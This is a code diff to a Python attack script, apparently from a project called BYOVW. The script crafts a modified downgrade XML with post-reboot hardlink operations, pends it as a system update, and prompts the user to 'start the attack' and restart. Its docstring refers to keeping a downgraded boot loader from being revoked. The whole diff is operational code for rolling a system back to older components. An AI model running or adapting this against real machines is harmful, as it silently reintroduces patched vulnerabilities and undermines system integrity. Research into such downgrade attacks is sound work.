@@ -2,6 +2,7 @@ import os
 
 from utils.component_store import create_base_update_files
 from utils.filesystem import create_dir, is_file_contents_equal, is_path_exists, Path
+from utils.update import pend_update
 from utils.xml import load_xml, find_child_elements_by_match, create_element, append_child_element
 
 """
@@ -13,8 +14,8 @@ Also make sure that the downgraded boot loader is not revoked
 
 
 def downgrade_to_base():
-    base_dir_path = Path("C:\\Users\\Alon\\Desktop\\BYOVW\\Update")
-    # base_dir_path = Path("C:\\Users\\User\\Desktop\\Repos\\BYOVW\\Update")
+    base_dir_path = Path("C:\\Users\\weak\\Desktop\\BYOVW\\Update")
+    downgrade_xml_path = Path("C:\\Users\\weak\\Desktop\\Pending.xml")
 
     print("[INFO] Creating update directory")
     create_dir(base_dir_path.full_path, exist_ok=True)
@@ -52,15 +53,20 @@ def downgrade_to_base():
         append_child_element(poq_post_reboot_element, hardlink_element)
 
     print("[INFO] Writing modified downgrade xml to disk")
-    downgrade_root.write("Downgrade.xml")
+    downgrade_root.write(downgrade_xml_path.full_path)
+
+    print("[INFO] Pending downgrade update")
+    pend_update(downgrade_xml_path.nt_path)
 
     print("[INFO] Restart your computer to be down to date!")
 
-    print(f"[WARNING] Skipped paths: {skipped_paths}")
+    if skipped_paths:
+        print(f"[WARNING] Skipped paths: {skipped_paths}")
 
 
 def main():
-    input("Press any key to start the attack")
+    input("[INFO] Press any key to start the attack")
+    downgrade_to_base()
 
 
 if __name__ == '__main__':
